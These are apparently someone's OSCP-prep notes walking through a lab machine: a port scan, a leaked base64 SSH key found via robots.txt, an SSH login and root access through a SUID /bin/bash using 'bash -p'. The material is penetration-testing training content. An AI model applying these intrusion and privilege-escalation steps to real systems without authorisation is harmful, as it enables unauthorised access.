# OSCP prep

```bash
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  socks5  syn-ack ttl 64

```

dirbuster found `robots.txt` which leads to `secret.txt`

The content of secret.txt was a base64 encoded ssh key.

The description mentions the only user on this box is oscp.

log in as oscp:

```bash
ssh -i id_rsa oscp@192.168.1.133
```

The SUID bit was set on `/bin/bash`, [GTFObins](https://gtfobins.github.io/gtfobins/bash/#suid)

![[Pasted image 20220529000202.png]]

also found some creds (probably won't need these though)

![[Pasted image 20220529000224.png]]

becoming root is as easy as
```bash
/bin/bash -p
```

I am root

![[Pasted image 20220529000230.png]]

![[Pasted image 20220529000245.png]]